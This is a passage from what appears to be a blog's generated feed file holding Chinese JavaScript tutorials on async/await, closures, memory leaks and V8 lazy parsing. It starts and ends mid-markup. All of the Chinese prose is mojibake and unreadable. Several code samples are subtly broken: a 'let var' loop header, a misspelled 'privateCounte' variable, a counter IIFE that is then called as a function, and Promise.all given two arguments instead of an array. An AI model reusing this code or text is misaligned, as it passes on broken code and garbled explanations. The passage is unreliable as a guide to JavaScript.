class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">g</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      reject(<span class="string">'no'</span>)</span><br><span class="line">    &#125;, <span class="number">2000</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">f</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> y = <span class="keyword">await</span> g()</span><br><span class="line">  <span class="built_in">console</span>.log(y)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f()</span><br></pre></td></tr></table></figure></li><li><p>awaitåªèƒ½ä¸²è¡Œï¼Œåšä¸åˆ°å¹¶è¡Œã€‚awaitä¸€å®šæ˜¯é˜»å¡çš„ï¼Œç”šè‡³å¯ä»¥é˜»å¡forå¾ªç¯ã€‚awaitåšä¸åˆ°å¹¶è¡Œï¼Œä¸ä»£è¡¨asyncä¸èƒ½å¹¶è¡Œã€‚åªè¦awaitä¸åœ¨åŒä¸€ä¸ªasyncå‡½æ•°é‡Œå°±å¯ä»¥å¹¶è¡Œ</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Promise</span>.all(ajax1(), ajax2())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">g</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      resolve(<span class="string">'no'</span>)</span><br><span class="line">    &#125;, <span class="number">2000</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è€—æ—¶20sæ‰æ‰“å°å®Œ</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">f</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> <span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> y = <span class="keyword">await</span> g()</span><br><span class="line">    <span class="built_in">console</span>.log(y)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// asyncå®ç°å¹¶è¡Œ</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  [<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>].forEach(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> y = <span class="keyword">await</span> g()</span><br><span class="line">    <span class="built_in">console</span>.log(y)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>å…¨å±€æ•è·é”™è¯¯å¿…é¡»ç”¨window.onerrorï¼Œä¸åƒPromiseå¯ä»¥ä¸“ç”¨window.addEventListener(â€˜unhandledrejectionâ€™, function)ï¼Œè€Œwindow.onerrorä¼šæ•è·å„ç§ç¨€å¥‡å¤æ€ªçš„é”™è¯¯ï¼Œé€ æˆç³»ç»Ÿæµªè´¹</p></li><li>try..catchå†…éƒ¨çš„å˜é‡æ— æ³•ä¼ é€’ä¸ªä¸‹ä¸€ä¸ªtry..catch</li><li>æ— æ³•ç®€å•å®ç°Promiseçš„å„ç§åŸç”Ÿæ–¹æ³•ï¼Œå¦‚race()</li></ul><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://juejin.cn/post/6844904096525189128" target="_blank" rel="noopener">Promise/async/Generatorå®ç°åŸç†è§£æ</a></li><li><a href="https://zhuanlan.zhihu.com/p/102017798" target="_blank" rel="noopener">å›¾è§£ Promise å®ç°åŸç†ï¼ˆäºŒï¼‰â€”â€” Promise é“¾å¼è°ƒç”¨</a></li><li><a href="https://zhuanlan.zhihu.com/p/100416432" target="_blank" rel="noopener">Promiseåˆ°åº•è§£å†³äº†å“ªäº›é—®é¢˜ï¼Ÿ</a></li><li><a href="https://juejin.cn/post/6844903988584775693" target="_blank" rel="noopener">async/await åŸç†åŠæ‰§è¡Œé¡ºåºåˆ†æ</a></li><li><a href="https://www.jianshu.com/p/0f1b6ae1888c" target="_blank" rel="noopener">async/await åŸç†åŠç®€å•å®ç°</a></li></ul>]]></content>
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>é—­åŒ…ï¼Œå†…å­˜æ³„éœ²</title>
      <link href="/2019/10/31/js-%E9%97%AD%E5%8C%85/"/>
      <url>/2019/10/31/js-%E9%97%AD%E5%8C%85/</url>
      <content type="html"><![CDATA[<blockquote><p>V8å¼•æ“å¦‚ä½•å®ç°é—­åŒ…ï¼Ÿä¸ºäº†è§£ç­”è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦å…ˆäº†è§£<em>å‡½æ•°å³å¯¹è±¡</em>, <em>æƒ°æ€§è§£æ</em>ã€<em>å‡½æ•°è°ƒç”¨æ ˆ</em>ã€<em>åƒåœ¾å›æ”¶</em>è¿™äº›æ¦‚å¿µã€‚å½“V8é‡åˆ°é—­åŒ…ï¼Œä¸€ä¸ªæœ¬åº”è¢«é”€æ¯çš„å˜é‡ï¼Œå› ä¸ºè¿˜è¢«å…¶ä»–åœ°æ–¹å¼•ç”¨ï¼ŒV8å¦‚ä½•ä¿ç•™è¿™ä¸ªå˜é‡ï¼Ÿè¿™ä¸ªå˜é‡ä¼šè¢«æ”¾åˆ°å“ªé‡Œï¼Ÿ</p></blockquote><p><br></p><h3 id="1-ä»€ä¹ˆæ˜¯é—­åŒ…ï¼Ÿ"><a href="#1-ä»€ä¹ˆæ˜¯é—­åŒ…ï¼Ÿ" class="headerlink" title="1. ä»€ä¹ˆæ˜¯é—­åŒ…ï¼Ÿ"></a>1. ä»€ä¹ˆæ˜¯é—­åŒ…ï¼Ÿ</h3><h3 id="2-å†…å­˜æ³„éœ²"><a href="#2-å†…å­˜æ³„éœ²" class="headerlink" title="2. å†…å­˜æ³„éœ²"></a>2. å†…å­˜æ³„éœ²</h3><h4 id="1-3-å†…å­˜æ³„éœ²"><a href="#1-3-å†…å­˜æ³„éœ²" class="headerlink" title="1.3 å†…å­˜æ³„éœ²"></a>1.3 å†…å­˜æ³„éœ²</h4><p>è¿™äº›ä¸å†è¢«éœ€è¦çš„å†…å­˜ï¼Œç”±äºæŸç§åŸå› ï¼Œæ— æ³•è¢«é‡Šæ”¾ï¼Œå°±æ˜¯å†…å­˜æ³„éœ²ã€‚å¸¸è§çš„å†…å­˜æ³„éœ²æ¡ˆä¾‹</p><ul><li>æ„å¤–çš„å…¨å±€å˜é‡</li><li>è¢«é—å¿˜çš„è®¡æ—¶å™¨æˆ–å›è°ƒå‡½æ•°</li><li>DOMå¼•ç”¨</li><li>é—­åŒ…</li></ul><h5 id="1-3-1-æ„å¤–åˆ›å»ºå…¨å±€å˜é‡"><a href="#1-3-1-æ„å¤–åˆ›å»ºå…¨å±€å˜é‡" class="headerlink" title="1.3.1 æ„å¤–åˆ›å»ºå…¨å±€å˜é‡"></a>1.3.1 æ„å¤–åˆ›å»ºå…¨å±€å˜é‡</h5><p>thisè¢«æŒ‡å‘äº†å…¨å±€å˜é‡windowï¼Œæ„å¤–åœ°åˆ›å»ºäº†å…¨å±€å˜é‡ã€‚è¿˜æœ‰ä¸€äº›æ˜ç¡®å®šä¹‰çš„å…¨å±€å˜é‡ï¼Œç”¨æ¥æš‚å­˜å¤§é‡æ•°æ®ï¼Œè®°å¾—åœ¨ä½¿ç”¨åï¼Œå¯¹å…¶é‡æ–°èµ‹å€¼ä¸ºnullã€‚æˆ–åœ¨javascriptæ–‡ä»¶å¤´éƒ¨åŠ ä¸Š<em><code>use strict</code></em>ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = <span class="string">'123'</span></span><br><span class="line">  <span class="comment">// name = '123'</span></span><br><span class="line">&#125;</span><br><span class="line">fn()</span><br><span class="line"><span class="built_in">console</span>.log(name);  <span class="comment">// "123"</span></span><br></pre></td></tr></table></figure></p><p><br></p><h5 id="1-3-2-æœªé”€æ¯çš„å®šæ—¶å™¨"><a href="#1-3-2-æœªé”€æ¯çš„å®šæ—¶å™¨" class="headerlink" title="1.3.2 æœªé”€æ¯çš„å®šæ—¶å™¨"></a>1.3.2 æœªé”€æ¯çš„å®šæ—¶å™¨</h5><p>æ²¡æœ‰å›æ”¶å®šæ—¶å™¨ï¼Œæ•´ä¸ªå®šæ—¶å™¨ä¾ç„¶æœ‰æ•ˆï¼Œä¸ä½†å®šæ—¶å™¨æ— æ³•è¢«å†…å­˜å›æ”¶ï¼Œå®šæ—¶å™¨å‡½æ•°çš„ä¾èµ–ä¹Ÿæ— æ³•å›æ”¶ã€‚</p><p><br></p><h5 id="1-3-3-DOMå¼•ç”¨"><a href="#1-3-3-DOMå¼•ç”¨" class="headerlink" title="1.3.3 DOMå¼•ç”¨"></a>1.3.3 DOMå¼•ç”¨</h5><p>å½“åˆ é™¤buttonçš„DOMèŠ‚ç‚¹æ—¶ï¼Œå˜é‡buttonä»ä¿å­˜åœ¨å†…å­˜ä¸­ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> btn = <span class="built_in">document</span>.getElementById(<span class="string">'myBtn'</span>);</span><br><span class="line">btn.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  btn.innerHTML = <span class="string">'hello'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.body.removeChild(btn);</span><br><span class="line">btn = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure></p><p><br></p><h5 id="1-3-4-é—­åŒ…"><a href="#1-3-4-é—­åŒ…" class="headerlink" title="1.3.4 é—­åŒ…"></a>1.3.4 é—­åŒ…</h5><p><strong>é—­åŒ…</strong>æ˜¯æŒ‡è¯»å–äº†å…¶ä»–å‡½æ•°å†…éƒ¨å˜é‡çš„å‡½æ•°ã€‚åˆ›å»ºé—­åŒ…çš„å¸¸è§æ–¹å¼ï¼Œå°±æ˜¯åœ¨ä¸€ä¸ªå‡½æ•°å†…éƒ¨åˆ›å»ºå¦ä¸€ä¸ªå‡½æ•°ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createComparisonFunction</span>(<span class="params">propertyName</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">object1, object2</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> value1 = object1[propertyName];</span><br><span class="line">    <span class="keyword">var</span> value2 = object2[propertyName];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> value1 - value2;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><em>æ¨¡æ‹Ÿç§æœ‰æ–¹æ³•</em><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> makeCounter = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> privateCounter = <span class="number">0</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line">    privateCounte += val;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    increment: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      change(<span class="number">1</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    decrement: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      change(<span class="number">-1</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    value: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> privateCounter;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)()</span><br><span class="line"><span class="keyword">var</span> counter1 = makeCounter();</span><br><span class="line">counter1.increment();</span><br><span class="line"><span class="built_in">console</span>.log(counter1.value())</span><br></pre></td></tr></table></figure></p><p><br></p><p><em>ä½¿ç”¨åŒ¿åé—­åŒ…</em><br>ä½¿ç”¨åŒ¿åé—­åŒ…ï¼Œä½¿å¾—å¾ªç¯ä¸­è¢«åˆ›å»ºçš„æ–¹æ³•ï¼Œä¸ä¼šå…±äº«åŒä¸€ä¸ªè¯æ³•ä½œç”¨åŸŸã€‚æˆ–è€…ï¼Œä½¿ç”¨letè€Œä¸æ˜¯varï¼Œå°±ä¸éœ€è¦å¢åŠ é¢å¤–çš„é—­åŒ…ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showHelp</span>(<span class="params">help</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">document</span>.getElementById(<span class="string">'help'</span>).innerHTML = help;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setupHelp</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> helpText = [</span><br><span class="line">      &#123;<span class="string">'id'</span>: <span class="string">'email'</span>, <span class="string">'help'</span>: <span class="string">'Your e-mail address'</span>&#125;,</span><br><span class="line">      &#123;<span class="string">'id'</span>: <span class="string">'name'</span>, <span class="string">'help'</span>: <span class="string">'Your full name'</span>&#125;,</span><br><span class="line">      &#123;<span class="string">'id'</span>: <span class="string">'age'</span>, <span class="string">'help'</span>: <span class="string">'Your age (you must be over 16)'</span>&#125;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; helpText.length; i++) &#123;</span><br><span class="line">    <span class="comment">// (function() &#123;</span></span><br><span class="line">    <span class="comment">//   var item = helpText[i];</span></span><br><span class="line">    <span class="comment">//   document.getElementById(item.id).onfocus = function() &#123;</span></span><br><span class="line">    <span class="comment">//     showHelp(item.help);</span></span><br><span class="line">    <span class="comment">//   &#125;</span></span><br><span class="line">    <span class="comment">// &#125;)()</span></span><br><span class="line">    <span class="keyword">let</span> item = helpText[i];</span><br><span class="line">    <span class="built_in">document</span>.getElementById(item.id).onfocus = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      showHelp(item.help);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setupHelp();</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="2-å‡½æ•°å³å¯¹è±¡"><a href="#2-å‡½æ•°å³å¯¹è±¡" class="headerlink" title="2. å‡½æ•°å³å¯¹è±¡"></a>2. å‡½æ•°å³å¯¹è±¡</h3><p>é¦–å…ˆæˆ‘ä»¬è¦ç†è§£ï¼Œå‡½æ•°æ˜¯ä¸€ä¸ªå¯æ‰§è¡Œçš„å¯¹è±¡ã€‚å®ƒæ—¢å¯ä»¥èµ‹å€¼ç»™ä¸€ä¸ªå˜é‡ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºå‡½æ•°çš„å‚æ•°ï¼Œè¿˜å¯ä»¥ä½œä¸ºå‡½æ•°çš„è¿”å›å€¼ã€‚</p><p>æˆ‘ä»¬å®šä¹‰ä¸€ä¸ªå‡½æ•°<em><code>function foo() {}</code></em>ï¼Œæ¥ç€è®¾ç½®<em><code>foo.myName = 1</code></em>ã€‚ä»æ§åˆ¶å°è¾“å‡ºç»“æœï¼Œå¯ä»¥å¾—çŸ¥ï¼Œæˆ‘ä»¬æ—¢å¯ä»¥ç»™<em><code>foo</code></em>æ·»åŠ å±æ€§ï¼Œä¹Ÿå¯ä»¥å®ç°è°ƒç”¨<em><code>foo</code></em>ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'foo'</span>)</span><br><span class="line">&#125;</span><br><span class="line">foo.myName = <span class="number">1</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.myName) <span class="comment">// 1</span></span><br><span class="line">foo() <span class="comment">// foo</span></span><br></pre></td></tr></table></figure></p><p>å› ä¸ºåœ¨V8å†…éƒ¨ï¼Œä¼šä¸ºå‡½æ•°å¯¹è±¡æ·»åŠ ä¸¤ä¸ªéšè—å±æ€§<em><code>name</code></em>å’Œ<em><code>code</code></em>ã€‚<em><code>name</code></em>æ˜¯å‡½æ•°åï¼Œ<em><code>code</code></em>çš„å€¼æ˜¯å‡½æ•°ä»£ç ï¼Œå½“æ‰§è¡Œå‡½æ•°è°ƒç”¨è¯­å¥æ—¶ï¼ŒV8ä¼šä»å‡½æ•°å¯¹è±¡ä¸­å–å‡º<em><code>code</code></em>å±æ€§å€¼ï¼Œç„¶åæ‰§è¡Œè¿™æ®µå‡½æ•°ã€‚</p><p><img src="/2019/10/31/js-é—­åŒ…/2.jpg"></p><p><br></p><h3 id="2-å‡½æ•°è°ƒç”¨æ ˆ-å †"><a href="#2-å‡½æ•°è°ƒç”¨æ ˆ-å †" class="headerlink" title="2. å‡½æ•°è°ƒç”¨æ ˆ + å †"></a>2. å‡½æ•°è°ƒç”¨æ ˆ + å †</h3><p>å®šä¹‰å¥½å‡½æ•°åï¼Œå½“æˆ‘ä»¬æ‰§è¡Œè¿™ä¸ªå‡½æ•°æ—¶ï¼Œå…¶å†…éƒ¨çš„ä¸´æ—¶å˜é‡ä¼šæŒ‰ç…§æ‰§è¡Œé¡ºåºè¢«å‹å…¥åˆ°æ ˆä¸­ã€‚</p><p>æ ˆçš„ç»“æ„å’Œéå¸¸é€‚åˆå‡½æ•°è°ƒç”¨è¿‡ç¨‹ã€‚åœ¨æ ˆä¸Šåˆ†é…èµ„æºå’Œé”€æ¯èµ„æºçš„é€Ÿåº¦éå¸¸å¿«ï¼Œè¿™ä¸»è¦å½’ç»“äºæ ˆç©ºé—´æ˜¯è¿ç»­çš„ï¼Œåˆ†é…ç©ºé—´å’Œé”€æ¯ç©ºé—´åªéœ€è¦ç§»åŠ¨ä¸‹æŒ‡é’ˆå°±å¯ä»¥äº†ã€‚</p><p>è™½ç„¶æ“ä½œé€Ÿåº¦éå¸¸å¿«ï¼Œä½†æ˜¯æ ˆä¹Ÿæ˜¯æœ‰ç¼ºç‚¹çš„ï¼Œå…¶ä¸­æœ€å¤§çš„ç¼ºç‚¹ä¹Ÿæ˜¯å®ƒçš„ä¼˜ç‚¹æ‰€é€ æˆçš„ï¼Œé‚£å°±æ˜¯æ ˆæ˜¯è¿ç»­çš„ï¼Œæ‰€ä»¥è¦æƒ³åœ¨å†…å­˜ä¸­åˆ†é…ä¸€å—è¿ç»­çš„å¤§ç©ºé—´æ˜¯éå¸¸éš¾çš„ï¼Œ</p><p>å› æ­¤æ ˆç©ºé—´æ˜¯æœ‰é™çš„ã€‚å› ä¸ºæ ˆç©ºé—´æ˜¯æœ‰é™çš„ï¼Œè¿™å°±å¯¼è‡´æˆ‘ä»¬åœ¨ç¼–å†™ç¨‹åºçš„æ—¶å€™ï¼Œç»å¸¸ä¸€ä¸å°å¿ƒå°±ä¼šå¯¼è‡´æ ˆæº¢å‡ºï¼Œæ¯”å¦‚å‡½æ•°å¾ªç¯åµŒå¥—å±‚æ¬¡å¤ªå¤šï¼Œæˆ–è€…åœ¨æ ˆä¸Šåˆ†é…çš„æ•°æ®è¿‡å¤§ï¼Œéƒ½ä¼šå¯¼è‡´æ ˆæº¢å‡ºï¼ŒåŸºäºæ ˆä¸æ–¹ä¾¿å­˜æ”¾å¤§çš„æ•°æ®ï¼Œå› æ­¤æˆ‘ä»¬ä½¿ç”¨äº†å¦å¤–ä¸€ç§æ•°æ®ç»“æ„ç”¨æ¥ä¿å­˜ä¸€äº›å¤§æ•°æ®ï¼Œè¿™å°±æ˜¯å †ã€‚</p><p><img src="/2019/10/31/js-é—­åŒ…/3.jpg"></p><p><em>æˆ‘ä»¬å¯ä»¥ç†è§£ä¸ºï¼Œä¸»çº¿ç¨‹çš„æ“ä½œæ˜¯ä¸€ç›´æ˜¯åœ¨è°ƒç”¨æ ˆä¸Šè¿ä½œï¼Œè€Œå…·ä½“æ‰§è¡ŒæŸä¸ªå‡½æ•°æ—¶ï¼Œä¼šä¸ºå‡½æ•°åˆ›å»ºä¸€ä¸ªå †ï¼Œå‡½æ•°çš„å†…éƒ¨å˜é‡éƒ½ä¼šè¢«æ”¾åœ¨å †ä¸Šã€‚</em></p><p><br></p><h3 id="3-å½“V8ç¢°åˆ°é—­åŒ…ä»£ç "><a href="#3-å½“V8ç¢°åˆ°é—­åŒ…ä»£ç " class="headerlink" title="3. å½“V8ç¢°åˆ°é—­åŒ…ä»£ç "></a>3. å½“V8ç¢°åˆ°é—­åŒ…ä»£ç </h3><p>æˆ‘ä»¬çŸ¥é“äº†å‡½æ•°å®é™…æ˜¯ä¸€ä¸ªå¯æ‰§è¡Œçš„å¯¹è±¡ï¼Œå‡½æ•°çš„å˜é‡ä¼šè¢«å­˜æ”¾åœ¨å †ä¸Šã€‚å½“V8ç¢°åˆ°é—­åŒ…ä»£ç æ—¶ï¼Œä¼šæ€ä¹ˆæ“ä½œï¼Ÿ</p><h4 id="3-1-æƒ°æ€§è§£æ"><a href="#3-1-æƒ°æ€§è§£æ" class="headerlink" title="3.1 æƒ°æ€§è§£æ"></a>3.1 æƒ°æ€§è§£æ</h4><p>é¦–å…ˆï¼ŒV8ä¸ä¼šä¸€æ¬¡æ€§å°†æ‰€æœ‰çš„JSè§£æä¸ºä¸­é—´ä»£ç ã€‚</p><ul><li><p>é¦–å…ˆï¼Œå¦‚æœä¸€æ¬¡è§£æå’Œç¼–è¯‘æ‰€æœ‰çš„ JavaScript ä»£ç ï¼Œè¿‡å¤šçš„ä»£ç ä¼šå¢åŠ ç¼–è¯‘æ—¶é—´ï¼Œè¿™ä¼šä¸¥é‡å½±å“åˆ°é¦–æ¬¡æ‰§è¡Œ JavaScript ä»£ç çš„é€Ÿåº¦ï¼Œè®©ç”¨æˆ·æ„Ÿè§‰åˆ°å¡é¡¿ã€‚å› ä¸ºæœ‰æ—¶å€™ä¸€ä¸ªé¡µé¢çš„ JavaScript ä»£ç éƒ½æœ‰ 10 å¤šå…†ï¼Œå¦‚æœè¦å°†æ‰€æœ‰çš„ä»£ç ä¸€æ¬¡æ€§è§£æç¼–è¯‘å®Œæˆï¼Œé‚£ä¹ˆä¼šå¤§å¤§å¢åŠ ç”¨æˆ·çš„ç­‰å¾…æ—¶é—´ï¼›</p></li><li><p>å…¶æ¬¡ï¼Œè§£æå®Œæˆçš„å­—èŠ‚ç å’Œç¼–è¯‘ä¹‹åçš„æœºå™¨ä»£ç éƒ½ä¼šå­˜æ”¾åœ¨å†…å­˜ä¸­ï¼Œå¦‚æœä¸€æ¬¡æ€§è§£æå’Œç¼–è¯‘æ‰€æœ‰ JavaScript ä»£ç ï¼Œé‚£ä¹ˆè¿™äº›ä¸­é—´ä»£ç å’Œæœºå™¨ä»£ç å°†ä¼šä¸€ç›´å ç”¨å†…å­˜ï¼Œç‰¹åˆ«æ˜¯åœ¨æ‰‹æœºæ™®åŠçš„å¹´ä»£ï¼Œå†…å­˜æ˜¯éå¸¸å®è´µçš„èµ„æºã€‚</p></li></ul><p>åŸºäºä»¥ä¸Šçš„åŸå› ï¼Œæ‰€æœ‰ä¸»æµçš„ JavaScript è™šæ‹Ÿæœºéƒ½å®ç°äº†<em>æƒ°æ€§è§£æ</em>ã€‚æ‰€è°“æƒ°æ€§è§£ææ˜¯æŒ‡è§£æå™¨åœ¨è§£æçš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœé‡åˆ°å‡½æ•°å£°æ˜ï¼Œé‚£ä¹ˆä¼šè·³è¿‡å‡½æ•°å†…éƒ¨çš„ä»£ç ï¼Œå¹¶ä¸ä¼šä¸ºå…¶ç”Ÿæˆ AST å’Œå­—èŠ‚ç ï¼Œè€Œä»…ä»…ç”Ÿæˆé¡¶å±‚ä»£ç çš„ AST å’Œå­—èŠ‚ç ã€‚</p><p><br></p><h4 id="3-2-é¢„è§£æå™¨"><a href="#3-2-é¢„è§£æå™¨" class="headerlink" title="3.2 é¢„è§£æå™¨"></a>3.2 é¢„è§£æå™¨</h4><p><em>è¿™æ ·å¸¦æ¥ä¸¤ä¸ªé—®é¢˜ï¼š</em></p><ul><li><em><code>foo</code></em>æ‰§è¡Œç»“æŸæ—¶ï¼Œå˜é‡<em><code>d</code></em>è¯¥ä¸è¯¥è¢«é”€æ¯ï¼Ÿ</li><li>å¦‚æœé‡‡ç”¨æƒ°æ€§è§£æï¼Œæ‰§è¡Œåˆ°<em><code>foo</code></em>å‡½æ•°æ—¶ï¼ŒV8åªä¼šè§£æ<em><code>foo</code></em>å‡½æ•°ï¼Œä¸ä¼šè§£æå†…éƒ¨çš„<em><code>inner</code></em>å‡½æ•°ï¼Œé‚£ä¹ˆV8å°±ä¸çŸ¥é“<em><code>inner</code></em>ä¸­å¼•ç”¨äº†å˜é‡<em><code>d</code></em></li></ul><p><em>æ­£ç¡®çš„å¤„ç†æ–¹å¼åº”è¯¥æ˜¯ï¼š</em></p><ul><li><em><code>foo</code></em>å‡½æ•°çš„æ‰§è¡Œä¸Šä¸‹æ–‡è¢«é”€æ¯</li><li><em><code>inner</code></em>å‡½æ•°å¼•ç”¨çš„<em><code>foo</code></em>å‡½æ•°ä¸­çš„å˜é‡<em><code>d</code></em>ä¸èƒ½è¢«é”€æ¯ã€‚</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// è™½ç„¶ foo å‡½æ•°çš„æ‰§è¡Œä¸Šä¸‹æ–‡è¢«é”€æ¯äº†</span></span><br><span class="line">  <span class="comment">// 